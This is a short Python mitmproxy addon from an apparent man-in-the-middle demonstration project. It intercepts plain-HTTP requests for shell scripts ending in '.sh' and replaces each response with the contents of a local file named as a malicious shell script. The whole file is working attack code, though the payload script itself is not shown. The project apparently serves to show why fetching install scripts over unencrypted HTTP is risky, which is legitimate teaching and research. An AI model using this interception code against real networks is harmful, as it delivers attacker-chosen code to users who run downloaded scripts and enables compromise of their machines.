# mitm/rewrite_payload.py
# http-mitm
# Author: Rushy Panchal
# Date: December 22nd, 2017
# Description: Rewrite payload of the request to a malicious shell script.

import os

from mitmproxy import http

MALICIOUS_SCRIPT_PATH = os.getenv('MALICIOUS_SCRIPT', 'mitm/malicious.sh')

with open(MALICIOUS_SCRIPT_PATH, 'r') as f:
  MALICIOUS_SCRIPT = f.read().encode('utf8')

def request(flow):
  if is_target_url(flow.request.pretty_url):
    flow.response = http.HTTPResponse.make(
      200,
      MALICIOUS_SCRIPT,
      {"Content-Type": "text/plain"}
      )

def is_target_url(url):
  '''Check if the url is a target.'''
  return url.startswith('http://') and url.endswith('.sh')
